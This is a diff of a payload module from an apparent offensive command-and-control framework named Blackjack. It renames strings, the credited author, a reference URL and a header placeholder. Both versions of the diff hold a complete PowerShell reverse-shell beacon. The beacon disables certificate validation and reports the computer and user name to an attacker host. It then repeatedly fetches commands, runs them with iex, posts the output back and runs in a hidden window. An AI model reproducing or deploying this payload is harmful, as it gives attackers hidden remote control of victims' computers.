@@ -1,12 +1,12 @@
-# This module is part of the blackjack framework
+# This module is part of the Blackjack framework
 
 class Payload:
 
     info = {
-        'Title' : 'Windows PowerShell IEX blackjack https',
-        'Author' : 'Panagiotis Chartas (r0jahsm0ntar1)',
+        'Title' : 'Windows PowerShell IEX BlackJack https',
+        'Author' : 'Rojahs Montari (r0jahsm0ntar1)',
         'Description' : 'An Https based beacon-like reverse shell that utilizes IEX',
-        'References' : ['https://github.com/r0jahsm0ntar1/blackjack', 'https://revshells.com']
+        'References' : ['https://github.com/r0jahsm0ntar1/africana-framework', 'https://revshells.com']
     }
 
     meta = {
@@ -35,4 +35,4 @@ public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidati
 ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
 "@
 [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
-$ConfirmPreference="None";$s=\'*LHOST*\';$i=\'*SESSIONID*\';$p=\'https://\';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/*VERIFY*/$env:COMPUTERNAME/$env:USERNAME -Headers @{"*HOAXID*"=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/*GETCMD* -Headers @{"*HOAXID*"=$i});if ($c -ne \'None\') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/*POSTRES* -Method POST -Headers @{"*HOAXID*"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join \' \')} sleep *FREQ*}} -WindowStyle Hidden'''
+$ConfirmPreference="None";$s=\'*LHOST*\';$i=\'*SESSIONID*\';$p=\'https://\';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/*VERIFY*/$env:COMPUTERNAME/$env:USERNAME -Headers @{"*BLACKJACKID*"=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/*GETCMD* -Headers @{"*BLACKJACKID*"=$i});if ($c -ne \'None\') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/*POSTRES* -Method POST -Headers @{"*BLACKJACKID*"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join \' \')} sleep *FREQ*}} -WindowStyle Hidden'''
